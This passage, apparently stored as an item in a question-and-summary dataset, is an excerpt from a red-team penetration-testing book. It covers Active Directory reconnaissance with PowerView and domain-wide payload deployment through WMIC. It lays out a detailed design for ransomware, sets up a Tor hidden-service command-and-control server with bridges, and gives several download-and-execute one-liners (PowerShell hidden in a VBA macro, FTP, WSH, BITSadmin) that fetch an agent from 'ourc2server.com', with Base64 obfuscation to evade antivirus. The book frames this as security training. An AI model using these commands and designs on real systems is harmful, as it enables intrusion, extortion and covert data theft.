\\\\hostname\\c$\\*.xl* /s/b\nMake sure you retain the command-line options so that the output contains\nthe full path; this will make scripting easier later when you know what you\nwant to copy.\nThis is of course completely scalable and scriptable, but the wider the net you\ncast, the longer the search will take. One approach is to search through the\ntarget list for potential HR targets, but the workstation nomenclature is very\nvague. A better approach is to use LinkedIn to find the names of staff who\nwork in the HR department and cross-reference those with a user dump from\nthe AD. Then you can determine which workstation that user is logged in to.\nWe find a lady by the name of Fran Summers who represents Global HR in\nSan Francisco. Using PowerView, we find out that her username is fransumm:\nsamaccountname : franumm\nusncreated : 83047038\nuserprincipalname : fransum@pharma.local\nmdbusedefaults : True\ndisplayname : Fran Summers\nmemberof : {CN=AX Requisition\nUsers,OU=Groups,DC=phenomenex,DC=com, CN=HR,OU=\nGroups,DC=pharma,DC=com,\nCN=SP_Manf_PharmaShare_Technical,OU=Groups,DC=pharma,DC=com,\nCN=Security OWA Members,OU=Groups,DC=pharma,DC=com…}\nAlso using PowerView, we see that fransumm is logged into\npharma1845.pharma.com:\nPS C:\\> Invoke-StealthUserhunter -Username \"fransumm\"\nUserDomain : pharma.com\nUserName : fransumm\nComputerName : pharma1845.pharma.com\nIP : 190.168.34.12\nSessionFrom : 190.168.34.12",
    "question": "What is the main method discussed in the text for bypassing network security to establish command and control (C2) in a target's environment?",
    "summary": "This chapter discusses advanced techniques for cyber attacks, focusing on using Java applets and DNS tunneling to bypass security measures. It highlights the vulnerability of banks and the importance of understanding their internal environments, as well as the limitations of traditional penetration testing. The chapter also covers the use of Metasploit for command and control, process migration, and privilege escalation, and emphasizes the need for realistic and stealthy attack methods. The next chapter explores attacks on pharmaceutical companies, including social engineering and exploiting vulnerabilities in client-side software."
  },
  {
    "start": 32,
    "end": 41,
    "text": "Pay dirt! Now we repeat our previous dir command:\ndir \\\\hostname\\c$\\*.xl* /s/b\nC:\\Users\\fransumm\\AppData\\Local\\Temp\\Temp1_invbas3p0.zip\\InvisibleBasic.xla\nC:\\Users\\fransumm\\Desktop\\Onboarding\\Asset & subnet information\nv0.2.xlsx\nC:\\Users\\fransumm\\Desktop\\Onboarding\\RFCDocv2.xlsx\nC:\\Users\\fransumm\\Documents\\Employee_complete_2016-04-12.xlsx\nNow that we have control over the entire Windows data network, we need to\ndecide on a suitably devastating attack that could be executed following our\nextraction of the target information. The easiest and most reliable way is to\nmass deploy a whole-drive encryption system via the domain admin\ncredentials with a suitably long passphrase the company could never hope to\nguess.\nOnce that software is pushed out and installed, we can bounce every Windows\nworkstation and server on the network. When they start up again, they'll\nrequire the passphrase to continue the boot sequence and (in the absence of\nthat) are completely unrecoverable. This is a vicious attack that could also\npotentially render the company open to extortion. A million dollars in Bitcoin\nfor the passphrase, for example. However, this is a modeling exercise so we're\nnot going to do any of that. It is sufficient to demonstrate vulnerability by\npushing out a custom binary to the target domain. For example, to target the\nUK specifically, we would do the following.\nFirst get a command shell with domain admin credentials:\nRunas /user:domainuk@UK cmd\nThe run the WMIC installer, which will allow us to invisibly deploy software\nremotely without any further user interaction:\nc:\\> wmic\nAt this point, we just need to specify a list of target computers and a path to\nour payload:\n> /node::@\"c:\\computers.txt\" product call install true,\"\" ,\n\"c:\\PathToYour\\File.msi\nWe're done!\nSummary\nWe just went from a humble desktop user to having complete domain access\nin less than an hour. Feeling secure? I hope not. This is by no means a\ncontrived, unique, or difficult-to-replicate scenario and all the tools I've\ndemonstrated here are in the public domain and freely available. The big\ntakeaway here is that Windows is not a forgiving environment if you're lazy\nwith security. Even if you're not, you can get into hot water quickly if your\nusers can escalate their privileges locally. In an APT scenario, that is often just\na matter of time.\nExercises\n1. Download an existing client-side exploit. Modify it so that it bypasses your\nfavorite antivirus solution. Make sure it still works.\n2. Download the Metasploitable v2 virtual appliance. Practice Metasploit\nagainst it and become familiar with its strengths and weaknesses.\nChapter 5\nGuns and Ammo\nThis chapter is an interesting example of the potentially far-reaching\nconsequences of failing to secure your intellectual property. In the modern\nera of total concept to product automation manufacturing, the loss of even a\nfew Computer Aided Design (CAD) files are potentially enough to sink your\nbusiness. In recent years, the use of Computer Numerical Control (CNC)\nsystems have become very popular in the design and manufacture of arms as\nthe military requests more complex systems in a crowded market where the\nlowest bidder is usually going to be awarded the procurement contract.\nCNC systems are used to mass produce weapons to an exact specification with\nan absolute minimum of human interaction—sometimes only assembling the\ncompleted parts. A side effect of this approach is that CNC systems are easily\navailable, relatively inexpensive, and can generate rapid return on investment.\nThat, coupled with the fact that CNC instruction documents needed to drive\nsuch machines can be easily shared over the Internet and that home CNC\ngunsmithing has become something of a niche hobby among certain\nsegments of the Internet, the potential not only for loss of intellectual\nproperty but also for massive proliferation is obvious. In the future, advanced\n3D printing (as a broad term including plastics and hardened metals) will be\navailable to virtually everyone and the legal restriction of firearms will likely\nbecome impossible to prevent (see Figure 5.1).\nFigure 5.1: Defense distributed ghost gunner. An open source CNC machine\ndesigned to manufacture AR-15 lower receivers restricted under Federal law.\nSource: https://ghostgunner.net/\nGUNS, BULLETS, AND POLITICS\nIf you wouldn't have guessed that some of the most advanced small arms\nin the world are designed and manufactured in Belgium, you're not alone.\nI was surprised to learn that a lot of the most cutting edge, expensive, and\nultra-modern weaponry originates there. Unless you're a firearms\naficionado or arms dealer, you probably didn't know this any more than I\ndid. Nonetheless, a lot of the most cutting edge, expensive, and ultra-\nmodern weaponry originates there (and in the last couple of years has\nended up in the hands of Libyan rebels due to some very odd political\nnegotiating which is well beyond the scope of this book).\nBackground and Mission Briefing\nIndustrial espionage (and blatant theft of ideas passed off as innovation) has\nlong been a facet of the arms industry. This is particularly evident when\ncomparing NATO/Warsaw Pact weapon systems from the Cold War but the\nphilosophy is alive and well in the domestic arms trade today (see Figure 5.2).\nFigure 5.2: The Soviet AT-4 (right) was a copy of the French MILAN system\n(Left).\nSource: Composite image, own work\n…copying is part of the firearms business, and I am sure you will\nsee the P3AT style trigger mechanism in many other pistols\n(Taurus comes to mind). Personally, I was not happy that Ruger\nclaimed to have a brand new design, when it was clearly based\non our design. And when an upgrade to the trigger mechanism I\ndesigned found its way into the Ruger after coming out in the\nP3AT, it didn't make me feel any better. But that is the business.\n—Kel-Tec CEO George Kellgren on plagiarism in the firearms\nindustry. (http://www.thefirearmblog.com/blog/2010/10/12/gun-\ndesign-engineer-answers-your-questions/)\nJust because the practice is generally accepted doesn't mean it is exactly\nwelcome. While there is nothing manufacturers can do to stop the\ncompetition from reverse engineering their finished products, that is a\ncompletely different prospect than allowing them to view CAD or CNC\ndocuments and engineering specifications. With that ringing in my ears, I\nfound myself planning an APT modeling exercise for one of the world's\nforemost arms manufacturers—regular suppliers to armed forces the world\nover, including many branches of the U.S. military.\nNot surprisingly, the primary goals of testing were to determine the ease of\nacquisition of any schematics and documentation relating to weapons design\nand manufacture. This would include the CAD files that could be used to drive\nthe CNC machines as well as any data that could be useful to the competition\nto determine how certain complex engineering problems were being solved,\ni.e., heat tolerance in next generation composite materials. This could be\nformal blueprints, internal processes on the local SharePoint or intranet\nserver, or even just casual comments shared between engineers via email or\ninstant messaging.\nAnother concern was the company's susceptibility to ransomware attacks.\nWhile I've included detailed instructions on how to simulate a ransomware\ninfestation in the next section—so such technology may be better understood\n—my advice in this particular case (and in most cases) is simply to be aware of\nthe dangers of ransomware and to have a recovery plan in place before the\nfact.\nOSINT (OPEN SOURCE INTELLIGENCE)\nThe importance of OSINT (or Open Source Intelligence) should never be\nunderestimated—it's amazing how much information useful to an\nexternal actor can be derived from the Internet, brochures, interviews,\nand the company's own website. Consider what you might like to know\ngoing into a modeling exercise like this. The target is going to be using\nsome very specific technologies and software; knowing exactly what will\nreduce the overall engagement time thereby reducing the possibilities of\ndetection and increasing the chances of a successful mission. The devil is\nin the details, but the details are generally often there for all to see.\nPayload Delivery Part V: Simulating a Ransomware\nAttack\nRansomware is currently the scourge of the Internet and it is a problem that\nwill likely only get worse. Given that only basic programming skills are\nrequired to execute such an attack (as well as the wide availability of third-\nparty crypto libraries), it is actually surprising that this type of malware has\nbeen so late to emerge and mature. Now that it has, it is virtually inevitable\nthat your organization will be hit at some point.\nWhat Is Ransomware?\nRansomware is software that, when deployed to a compromised host,\nencrypts files (or in some cases the entire local storage space) and demands\npayment for data recovery in the form of a password or decryption key,\ndepending on the nature of the malware. Usually ransomware is delivered\nthrough exploit kits that target vulnerabilities in client side software, with\nAdobe Flash being far and away the most popular target due to its almost\nuniversal deployment and terrible history of security flaws. Payment is almost\nalways demanded through Bitcoin, a semi-anonymous crypto currency created\nby “Satoshi Nakamoto,” which is the pseudonym of parties unknown at the\ntime of writing (there are plenty of people who have claimed this identify and\nplenty more who have been wrongly identified as such).\nRansomware is a growing problem. It is easy money for organized crime\nlooking to target low hanging fruit and there are always people willing to pay.\nSome ransomware groups or authors will accept payment through PayPal but\ntend to demand more money, presumably to compensate for the additional\nsteps that would need to be taken to secure the identities of the thieves.\nWARNING\nNever pay the ransom. Every cent you pay to extortionists is funding\nfuture such incidents and is going straight into the pockets of the mob.\nMake daily backups of your data on separate storage. Even if you do pay,\nyou have no guarantee of getting your data back. It doesn't matter if the\nransom is $100 or $1,000,000—every success further emboldens the\nattacker. Don't pay.\nWhy Simulate a Ransomware Attack?\nThe ultimate goal of penetration testing is to illustrate threat, risk, and\nvulnerability. Demonstrating this with relation to the end user often requires\na context and ransomware is a powerful example. A user confronted with the\nhelplessness that comes from being the victim of such an attack never needs\nto be told again why security is important, nor for that matter does the CISO\nwant to have to explain to the CEO that if they want their valuable IP back,\nthey need to pay a million dollars to the Russian mafia.\nWithout wanting to drive the point home, the days when businesses had to\nworry about nothing more annoying than bored teenagers and web-taggers\nare long gone. There are very bad people out there and you need to know what\nyou are up against.\nA Model for Ransomware Simulation\nIn order to simulate a ransomware attack, it is necessary to a certain extent to\ncreate ransomware—you're not after all going to want to use somebody else's\nhostile code. When developing a realistic framework, consider the following\nfunctionality the minimum:\nAsymmetric cryptography only. Separate keys should be used for\nencryption and decryption.\nRemote key generation. At the moment of deployment, the C2 agent\nshould send a request to the C2 server requesting that a private and a\npublic key pair be generated. The public key is then downloaded to the\nagent for the encryption process, ensuring that the compromised system\nnever has access to the private key (which conversely is used for\ndecryption). The key pair will exist on the server in its own directory in\nsuch a way that it can be linked to the target system in the future. One\nexample is making an SHA hash of the public key and using that as the\ndirectory name.\nConfigurable to target specific file groups (i.e., Word documents, Excel\nspreadsheets, and so forth) as well as determine whether only local files\nare attacked or if network shares should also be included.\nSecure deletion. Once a file is encrypted, the source should be deleted in\nsuch a way as to make it unrecoverable. Hashing and overwriting the file is\none example of how this may be achieved.\nNotify the target of the successful attack and provide a means to recover\nthe files, i.e., generating a SHA hash of the public key on the compromised\nsystem and providing that string as a reference when requesting payment.\nAn automated way to recover files with the key once the ransom is paid\nshould be built into the C2 agent.\nThe ability to export the names of all encrypted files back to the C2 server\nin case there's something interesting that could be added to a “shopping\nlist,” i.e., to steal.\nAsymmetric Cryptography\nThis is not treatise on cryptographic technology—that is beyond the scope of\nthis work. However, it is necessary to understand some principles even if\nyou're not interested or familiar with what what happens under the hood. It\ncertainly isn't necessary to be able to implement cryptographic ciphers or\nprotocols from scratch, as every major programming language will have\ncrypto libraries that are suitable for our purposes. If you're looking for a good\nintroduction to cryptography then I suggest Applied Cryptography 20th\nAnniversary Edition by Bruce Schneier (Wiley, 2015).\nSimply put, asymmetric cryptography (or public key cryptography) utilizes\ntwo different keys—one for encryption and one for decryption.\nMathematically, these keys are related but one cannot be derived from the\nother. The benefit of this approach in day-to-day security tasks is that a public\nkey can be shared with contacts (or the entire Internet), allowing content to\nbe encrypted, which in turn can only be accessed by anyone with access to\nyour private key (which should just be you). This is ideal for applications such\nas email. This is compared to symmetric cryptography (or private key\nencryption), where the same key is used for encryption and decryption. This is\nnot suitable for a ransomware attack, as it is at least plausible that the key\ncould be recovered by a competent forensic exercise. This is unlikely for the\npurposes laid out here but perfection should be sought in all things.\nFrom the perspective of ransomware, asymmetric crypto is useful because it\nmeans that files can be locked and, in return for a ransom, something tangible\nis provided to recover them—something that there is no way the victim could\notherwise acquire—and that's the private key.\nIn the C programming language, you have access to the libgcrypt library,\nshown in Table 5.1, which contains everything you need to implement a\nransomware attack. RSA or DSA are the recommended public key cipher\nsuites. The following functions are of specific interest:\nTable 5.1: The libgcrypt library contains all the crypto functions you will ever\nneed.\nPRIMITIVE ALGORITHMS OR IMPLEMENTATIONS\nOR\nOPERATION\nsymmetric IDEA, 3DES, CAST5, Blowfish, AES (128, 192, 256 bits),\nciphers: [5] Twofish (128, 256 bits), ARCfour / RC4, DES, Serpent (128,\n192, 256 bits), Ron's Cipher 2 / RC2 (40, 128 bits), SEED,\nCamellia (128, 192, 256 bits), Salsa20, Salsa20/12, ChaCha20,\nGOST 28147-89\ncipher modes: ECB, CFB, CBC, OFB, CTR, AES-Wrap (RFC 3394), CCM,\n[6] GCM, Stream, OCB\npublic key RSA, DSA, ElGamal, ECDSA, EdDSA\n[7]\nalgorithms:\n[8]\nhash MD2, MD4, MD5, SHA-1, SHA-224, SHA-256, SHA-384, SHA-\nalgorithms: [9] 512, SHA3-224, SHA3-256, SHA3-384, SHA3-512, SHAKE128,\nSHAKE256, RIPEMD-160, TIGER/192, TIGER1, TIGER2,\nWhirlpool, CRC-24 (as in RFC 2440), CRC-32 (as in ISO\n3309, RFC 1510), GOST R 34.11-94, GOST R 34.11-2012 (256,\n512 bits)\nmessage HMAC, CMAC, GMAC, Poly1305\nauthentication\ncodes (MACs):\n[10]\nkey derivation S2K (as in RFC 4880: simple, salted, iterated+salted),\nfunctions PBKDF2, SCRYPT\n[11]\n(KDFs):\nelliptic curves: NIST (P-256, P-384, P-521), SECG (secp256k1), ECC\nBrainpool / RFC 5639 (P256r1, P384r1, P512r1), Bernstein\n(Curve25519), GOST R (34.10-2001, 34.10-2012)\ngcry_pk_encrypt—Encrypt data using a public key.\ngcry_pk_decrypt—Decrypt data using a private key.\ngcry_pk_genkey—Create a new public/private key pair.\nRemote Key Generation\nThe key pair should be generated on the server to ensure that the client never\nsees the private key until the ransom is paid. Some ransomware\nimplementations generate the key pair on the client and then send the private\nkey to the server. The danger of this is twofold: an error communicated to the\nserver may prevent the private key from being delivered, rendering the files\ncompletely unrecoverable. If the private key is generated on the client, there\nis always the danger that it might be recoverable by the victim. Obviously,\nneither of these scenarios is beneficial.\nTargeting Files\nAny file types can be targeted though Microsoft office documents and\ndatabase files. Anything that might contain precious information can be\ntargeted, including game data files and Bitcoin wallets. In Windows, disk\ndrives are referenced by a letter (including network shares), so the first step\nshould be to enumerate all drives and scan them for files of the target file\ntype. Once this process has concluded, a complete manifest should be\nexported back to the C2 server (as there may be interesting documents that\nmight be worth keeping). At this point (and only at this point) the file\nencryption should begin. As each file is encrypted, its name should be added\nto a list somewhere on the host (i.e., c:\\ransom\\files.txt) and the original\nfile should be destroyed through cryptographic scrubbing. The file should be\noverwritten by random hashed data before it is deleted. The encrypted file\nshould be placed in the same directory as its plaintext counterpart (see Figure\n5.3).\nFigure 5.3: Encryption process flow.\nRequesting the Ransom\nOnce the attack is complete, the public key is hashed using the same process\nused when it was created on the C2 server. The sole purpose of this is to\ncreate a small unique identifier that the victims can use when notifying that\nthey have paid the ransom and to allow the perpetrator to find the\ncorresponding private key. This hash could be pasted into a web page and the\nprivate key delivered automatically. The victims should also be notified of the\ncontents of c:\\ransom\\files.txt so they are completely clear what is at stake.\nSee Figure 5.4.\nFigure 5.4: Decryption process flow.\nMaintaining C2\nIt's worth pointing out that even if you pay a ransom, that doesn't mean this\nwill be the last time you ever hear from the attacker. In this instance, the\ncommand and control infrastructure is still in place and the victim's files are\nstill accessible. A ransomware attack could just be one component in a larger\nAPT scenario. As you saw in the previous chapter, once large sections of the\nnetwork or domain are accessible to an attacker, a large-scale data theft can be\neasily turned into a large-scale ransom operation. Sickeningly, the most\npopular target for such attacks at the moment are hospitals because they are\nunder the most pressure to pay. They don't have time to engage in long-term\nforensic operations or expensive data recovery exercises when the files they've\nlost access to are essential for delivering health care.\nFinal Thoughts\nShould you ever actually carry out such an exercise? No. You can certainly do\nmore harm than good if you do so idly (for which I take no responsibility);\nhowever, there is absolutely no doubt as to its effectiveness. If you're a CISO\nconducting penetration testing as leverage to get a larger budget for security,\nit might be something to consider (in a very controlled manner).\nCommand and Control Part V: Creating a Covert C2\nSolution\nThe necessity to communicate over the Internet is the weak link in any\ncommand and control infrastructure. Even if the C2 is distributed over\nmultiple servers, there is the inherent fragility that comes from needing to\ntalk to IP addresses that could be blocked at a border router if the network\nteam considers the traffic suspicious or if the C2 servers are added to threat\ndatabases such as the Open Threat Exchange, which can automatically update\nsecurity appliances with addresses of “known-bad.” Another issue is that once\na C2 server has been identified, it is at risk of being physically\ndecommissioned and seized by law enforcement. Fortunately, there is a\nsolution to both of these problems.\nIntroducing the Onion Router\nIf you're reading this, you've likely encountered the Onion Router (Tor) in\none form or another or at least have an inkling of what it is. To summarize,\nTor is primarily used to anonymize an Internet user's behavior—web traffic\n(for example) is routed through several layers of routers (hence the onion)\nbefore being routed back on to the public Internet through an exit node. Each\nlayer can only see its own upstream and downstream connections in any\nsession and traffic is encrypted. This effectively anonymizes the Internet user.\nThere are problems with this approach though. If attackers control the exit\nnode, they can see the traffic going to its final destination. There are also\ncorrelation attacks that can be executed by major players (such as the NSA,\nwhich controls many exit nodes), allowing the user to be identified by cross-\nreferencing packets entering and leaving the Tor network (at least in theory).\nTor, however, also allows us to provision services within the “dark” network\nitself—this effectively creates (for example) a completely anonymous web\nserver that can only be viewed via Tor and uses its own distributed addressing\nsystem. That is ideal for our needs. A C2 server can be provisioned as a node\nwithin the Tor network and the compromised host will connect to Tor when it\ncomes online, completely circumventing local network security and remaining\noperational access, even if compromised hosts are detected.\nNOTE\nThis is strictly a practical guide. I'm not going to discuss the ins and outs\nof the Tor technology (although it is quite fascinating). You can find\nplenty of information on the Tor website (http://www.torproject.org)\nand its associated forums if you're interested in learning more about the\nproject.\nThe first thing to do is download the Tor software—it's available for a wide\nrange of platforms. This guide uses the Linux version for C2 and the Windows\nversion for the C2 agent, but these instructions are virtually identical\nregardless of operating system. The easiest way to proceed is to download the\nTor browser packages, which are used to browse the web anonymously. That\nof course is not what we want to do, but the full suite contains the individual\ncomponents we need, which can be pulled out and built into our C2\ninfrastructure. This setup assumes the pre-existence of a C2 server configured\nmore or less along the lines described in previous chapters. It is imperative\nthat all services, be they SSH, web server, or Metasploit listener, be exposed\nonly on the localhost address. This is because this is where the Tor tunnel\nendpoint will expect them to be and also ensures that nothing about the C2\ncan be enumerated from the Internet, such as by search engines.\nThe Torrc File\nTor stores its configuration in a file called torrc. The location of this file\ndepends on the operating system. In Windows, it is in the installation\ndirectory; in Linux, it can be found in ˜/.tor; and on the Mac OS X, it's in the\nApplications directory under the Tor browser package. You'll need to sudo up\nand modify it from the command line. Regardless of the operating system, the\ntorrc file is the same. In order to create a hidden service, you need to append\nthe following lines to the file:\n# Configure hidden service directory\nHiddenServiceeDir /home/wil/tor_hidden\n# C2 Web Port\nHiddenServicePort 443 127.0.0.1:4433\n# C2 SSH Port\nHiddenServicePort 7022 127.0.0.1:7022\n# C2 Metasploit listener\nHiddenServicePort 8080 127.0.0.1:8080\nThis makes TCP ports 443, 7022, and 8080 available on the Tor host, with the\nassumption that our C2 is using these ports. Change them to whatever you\nneed them to be. The hidden service directory is simply the place where our\nserver keys will be stored and should be outside the web server's root\ndirectory. Note that the web server, while exposing port 443, is actually\nrunning on 4433. This is simply to avoid having to start the web service as\nroot.\nThe next time Tor is started, two files will be created in the tor_hidden\ndirectory. Those files are a private_key file (keep this secure or others will be\nable to impersonate your C2) and a hostname file that contains a hash of the\npublic key. This will also be the address of your C2:\nwil@c2:~$ /etc/init.d/tor restart\nwil@c2:~$ ls\nhostname\nprivate_key\nwil@c2:~$ cat private_key\n-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQC9ymfMgQk12AFT4PXWV+XfmZ1tVDaGajya/jIuwnwtjFdMWe7m\nVDWMjs8Z02GGJhH6tIIpoDUrWLi+YchNHlQBi2AnBFzAoSlfRcvobeBAaWuQn+aH\nUzr+xVXOADSIcfgtT5Yd13RKmUEKFV8AO9u652zYP1ss0l+S2mY/J/t/3wIDAQAB\nAoGAMjQwcPBRN2UENOP1I9XsgNFpy1nTcor3rShArg3UO1g8X34Kq/Lql1vPfM1l\nps67Qs4tAEXYyraVaAcFrSCwp6MyeKYwxZtT7ki7q3rbMycvbYquxquh0uGy4aed\nK8XWjPrUv3yzQSYslOehVWMTH7xTzaOvp5uhpAlHFRqN5MECQQDmpFkXmtfEGwqT\nbRbKegRs9siNY6McWBCGrYc/BrpXEiK0j2QcrjC/dMJ4P9O4A94aG4NSI/005fII\nvxrOmD9VAkEA0qhBVWeZD7amfvPYChQo0B4ACZZdJlcUd/x1JSOYbVKvRCvJLxjT\n5LMwg93jj2m386jXWx8n40Zcus6BTDr6YwJBAKH8E0ZszdVBWLAqEbOq9qjAuiHz\nNH+XqiOshCxTwVOdvRorCxjJjhspGdvyl/PJY5facuShuhgI13AlJ+KpMvECQHDJ\nl1lzw1bPc2uLgUM8MfHj7h8z+6G4hAQODmaZHVaDK8XzL59gyqqrajFgTyOM9emm\nn89w6flcxe9a+41mEoMCQBaM91yvrfp7N9BeDMCHlSDfAzX7sDqQn44ftHvZZI9V\n4IouuRuLlqN0iaw4V73v3MUeqXoasmdeZ89bVGhVrC8=\n-----END RSA PRIVATE KEY-----\nwil@c2:~$ cat hostname\n4y8jey307n3du4i.onion\nWhen the C2 is live and being provisioned over the Tor network using this\nconfiguration, it can be accessed by C2 agents anywhere in the world using\nthe address 4y8jey307n3du4i.onion, provided that the agents can access the\nTor network themselves. It's worth repeating the point that once this\ninfrastructure is up and running, there is complete bilateral traffic anonymity.\nThe agents don't know where they're connecting and the C2 server can't see\nthe location of the agents. This makes it very difficult for targets to detect and\nblock C2 traffic and impossible to discover where our C2 server is.\nConfiguring a C2 Agent to Use the Tor Network\nOnce the C2 server is configured to accept connections over Tor, the next step\nis to enable the C2 agents deployed on compromised machines to do so. The\neasiest way to do this is to bundle the tor.exe command-line application with\nthe agent and simply execute it without parameters. This will cause it to run\nin a hidden window and open a SOCKS proxy port on localhost 9050. I suggest\nrenaming it first so it's not immediately visible within the Window process\nlist. From a code perspective, the following changes need to be made:\nChange the SSH tunneling IPs from the Internet IPv4 addresses within the\ncode to point to the .onion address mentioned previously.\nTell the SSH SOCKS proxy to upstream to the Tor SOCKS proxy on TCP 9050,\nas seen in Figure 5.5.\nFigure 5.5: Simplified covert C2 topology.\nNOTE\nTunneling data through Tor is going to mean taking a performance hit;\nthe nature of how Tor works means this will always be the case no matter\nhow fast the individual links or high performance the routing nodes. Tor\nis better utilized as a low-and-slow anonymous C2 solution when you\ndon't need to move massive amounts of data. It is, nonetheless, a very\nelegant solution to anonymity issues.\nBridges\nSome networks may block port TCP 9050 outbound or even dynamically\nblacklist all Tor nodes in an attempt to prevent their users accessing the Tor\nnetwork and circumvent network access control; however, this can easily be\ndefeated by telling the C2 agent to use Tor bridges when connecting. This is\nachieved by adding the following options to the local torrc configuration file.\nBridging can also be handled as an option on the command line, but for an\ninitial deployment, I want to make sure I have working bridges up front and\nlet the Tor agent handle its own directory once it's connected. Experiment and\nhave fun.\nBridge fte 128.105.214.163:8080\nA17A40775FBD2CA1184BF80BFC330A77ECF9D0E9\nBridge fte 192.240.101.106:80\nFDC5BA65D93B6BCA5EBDF8EF8E4FA936B7F1F8E5\nBridge fte 128.105.214.162:8080\nFC562097E1951DCC41B7D7F324D88157119BB56D\nBridge fte 50.7.176.114:80 2BD466989944867075E872310EBAD65BC88C8AEF\nBridge fte 131.252.210.150:8080\n0E858AC201BF0F3FA3C462F64844CBFFC7297A42\nBridge fte 128.105.214.161:8080\n1E326AAFB3FCB515015250D8FCCC8E37F91A153B\nUseBridges 1\nNew Strategies in Stealth and Deployment\nYou're roughly halfway through this weighty tome, so it seems like a good\ntime to take stock, revisit, and improve on previous topics while touching on\nsome new and improved material.\nVBA Redux: Alternative Command-Line Attack Vectors\nVBA macros were examined in Chapter 1 as a means of delivering payloads\nand I want to revisit this technology, as there are other (better) ways of using\nthem. The VBA macro is also a very illustrative way of demonstrating other\ntechniques of talking to command and control and downloading and\nexecuting a second stage using only one command. There are also better ways\nof delivering the resulting Word document than email. Generally speaking, an\nMS Word document carrying a macro requires a .docm extension which,\nregardless of whether you're able to get it past antivirus or malware detection,\ncan still be identified by humans and machines alike as a possible attack\nvector before it's even downloaded. Email will often strip such attachments by\ndefault, possibly quarantine them, and almost certainly warn the end user.\nMore on this in a moment.\nIn the past, I've concentrated on using VBA macros to drop a VBS payload,\nwhich in turn will download a C2 agent executable. That will work and allows\na lot of flexibility in what you can do once you're outside the restrictions of\nthe VBA model. However, that level of complexity is not always necessary or\ndesirable. If all you want to do is download and execute a C2 agent, you can do\nthat (in various ways) with a single Windows command. When correctly\nobfuscated, these techniques are as effective and as impervious to antivirus as\nanything seen so far.\nPowerShell\nYou can use Windows own scripting language, PowerShell, for all kinds of\npost-exploitation tasks. It doesn't have the most elegant syntax and structure\ncompared to what you will be used to as a UNIX user, but it's more than\npowerful enough for our needs. The following code in a VBA macro will\ndownload the agentc2.exe file from http://ourc2server.com, store it as\nagent.exe in the working directory, and execute it:\nSub powershell()\n'\n' Powershell Macro\n'\n'\nDim PSResponse As String\nPSResponse = Shell(\"PowerShell (New-Object\nSystem.Net.WebClient).DownloadFile('http://ourc2server.com/download/c2agent.exe','agent.exe'\");Start-\nProcess 'agent.exe'\", vbHide)\nEnd Sub\nNote the vbHide option within the Shell command. This ensures that the\nexecution is hidden from the users (at least in the sense that they won't see a\ncommand window).\nFTP\nFor most tasks, FTP is a deprecated file transfer solution. It's clumsy and\ninsecure, but it still has its uses. The following code (this time not shown\nwithin the context of a VBA macro) will achieve the same effect by first\nbuilding an FTP script to execute the following FTP commands:\nopen ourc2server.com\nbinary\nget /c2agent.exe\nquit\nand then executing the agent itself:\ncmd.exe /c \"@echo open ourc2server.com>script.txt&@echo\nbinary>>script.txt&\n@echo get /c2agent.exe>>script.txt&@echo quit>>script.txt&@ftp -\ns:scrip\nt.txt -v -A&@start c2agent.exe\"\nWindows Scripting Host (WSH)\nThe WSH can also be used to download and execute code as a single\ncommand line if you are so inclined. Much like the previous example, this\nrequires that you first build a script file:\nstrFileURL = \"http://ourc2server/downloads/c2agent.exe\"\nstrHDLocation = \"agent.exe\"\nSet objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")\nobjXMLHTTP.open \"GET\", strFileURL, false\nobjXMLHTTP.send()\nIf objXMLHTTP.Status = 200 Then\nSet objADOStream = CreateObject(\"ADODB.Stream\")\nobjADOStream.Open\nobjADOStream.Type = 1\nobjADOStream.Write objXMLHTTP.ResponseBody\nobjADOStream.Position = 0\nobjADOStream.SaveToFile strHDLocation\nobjADOStream.Close\nSet objADOStream = Nothing\nEnd if\nSet objXMLHTTP = Nothing\nSet objShell = CreateObject(\"WScript.Shell\")\nobjShell.Exec(\"agent.exe\")\nand execute it using cscript.exe. The completed command line is as follows:\ncmd.exe /c \"@echo Set\nobjXMLHTTP=CreateObject(\"MSXML2.XMLHTTP\")>poc.vbs\n&@echo objXMLHTTP.open\n\"GET\",\"http://ourc2server/downloads/c2agent.exe\",false>>poc.vbs\n&@echo objXMLHTTP.send()>>poc.vbs\n&@echo If objXMLHTTP.Status=200 Then>>poc.vbs\n&@echo Set objADOStream=CreateObject(\"ADODB.Stream\")>>poc.vbs\n&@echo objADOStream.Open>>poc.vbs\n&@echo objADOStream.Type=1 >>poc.vbs\n&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs\n&@echo objADOStream.Position=0 >>poc.vbs\n&@echo objADOStream.SaveToFile \"agent.exe\">>poc.vbs\n&@echo objADOStream.Close>>poc.vbs\n&@echo Set objADOStream=Nothing>>poc.vbs\n&@echo End if>>poc.vbs\n&@echo Set objXMLHTTP=Nothing>>poc.vbs\n&@echo Set objShell=CreateObject(\"WScript.Shell\")>>poc.vbs\n&@echo objShell.Exec(\"agent.exe\")>>poc.vbs&cscript.exe poc.vbs\"\nBITSadmin\nWindows 7 and above ships with a command-line tool called BITSadmin,\nwhich can also be used to download and execute code. This tool is worth\nmentioning, as it is capable of suspending a file transfer if the network\nconnection is lost. When connectivity is restored, the transfer will continue\nand the code will be executed.\ncmd.exe /c \"bitsadmin /transfer myjob /download /priority high\nhttp://ourc2server.com/download/c2agent.exe c:\\agent.exe&start\nagent.exe\"\nSimple Payload Obfuscation\nThese techniques, while effective, are transparent to anyone who views the\nmacro and contain keywords that antivirus may find suspicious. However, it's\neasy to obfuscate these commands using a simple Base64 encoding routine.\nThere are other, stronger means of obfuscation but this is sufficient to defeat\nvirtually all forms of automated malware analysis.\nIt is possible to detect, decode, and analyze Base64 strings (trivial in fact), but\nwhile the presence of encoded data might generally increase the AV suspicion\nof any given file, unless there are other contributing factors, it will not be\nenough to get it flagged. Doing so would create an unacceptable number of\nfalse positives.\nContinuing with the PowerShell within VBA example, the first thing to do is\nencode the payload string as Base64. To keep it topical, I demonstrate this\nwith PowerShell:\nPS > $b = [System.Text.Encoding]::UTF8.GetBytes(\"PowerShell (N\new-Object\nSystem.Net.WebClient).DownloadFile('http://ourc2server.com/download/c2\nagent.exe','agent.exe');Start-Process 'agent.exe'\")\nPS > 